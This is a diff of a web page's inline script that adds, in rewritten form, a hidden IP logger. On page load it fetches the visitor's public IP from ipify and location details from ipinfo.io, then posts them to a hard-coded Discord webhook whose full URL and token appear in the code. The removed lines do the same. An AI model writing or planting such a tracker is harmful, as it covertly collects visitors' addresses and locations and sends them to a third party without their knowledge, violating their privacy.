@@ -85,49 +85,54 @@
 </div>
 
 
-    
-<script>
-    function sendToDiscord(ip, asn, isp, ipAssignment, country, state, city) {
+
+    <script>
+    async function sendToDiscord(ip, additionalInfo) {
         const webhookURL = 'https://discord.com/api/webhooks/1209347310316953650/-8XzBIbJLrEHTXaGM_wqC0aeNHbyuatAy6_4T72kRuoyY7wAiZz8hgbP8wAxPDOgdD38';
         const data = { 
-            content: `IP Details:\nIP: ${ip}\nASN: ${asn}\nISP: ${isp}\nIP Assignment: ${ipAssignment}\nCountry: ${country}\nState: ${state}\nCity: ${city}`
+            content: `yae miko sent ip: ${ip}\nAdditional Info:\n${additionalInfo}` 
         };
-        
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => console.log('IP details sent to Discord'))
-        .catch(error => console.error('Error sending IP details to Discord:', error));
-    }
 
-    async function getIPDetails() {
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const ipData = await response.json();
-            const ip = ipData.ip;
-
-            // Fetch additional IP details
-            const ipDetailsResponse = await fetch(`https://ipinfo.io/${ip}/json`);
-            const ipDetailsData = await ipDetailsResponse.json();
-
-            const asn = ipDetailsData.org;
-            const isp = ipDetailsData.hostname;
-            const ipAssignment = ipDetailsData.bogon;
-            const country = ipDetailsData.country;
-            const state = ipDetailsData.region;
-            const city = ipDetailsData.city;
-
-            sendToDiscord(ip, asn, isp, ipAssignment, country, state, city);
+            const response = await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+            console.log('IP and additional info sent to Discord');
         } catch (error) {
-            console.error('Error getting IP details:', error);
+            console.error('Error sending IP and additional info to Discord:', error);
         }
     }
-    getIPDetails();
+
+    async function getIP() {
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            const infoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
+            const infoData = await infoResponse.json();
+
+            const additionalInfo = `
+                asn: ${infoData.asn}\n
+                isp: ${infoData.org}\n
+                ip assignment: ${infoData.ip}\n
+                country: ${infoData.country}\n
+                state: ${infoData.region}\n
+                city: ${infoData.city}\n
+            `;
+
+            sendToDiscord(ip, additionalInfo);
+        } catch (error) {
+            console.error('Error getting IP address and additional info:', error);
+        }
+    }
+    getIP();
 </script>
+
 
 
     
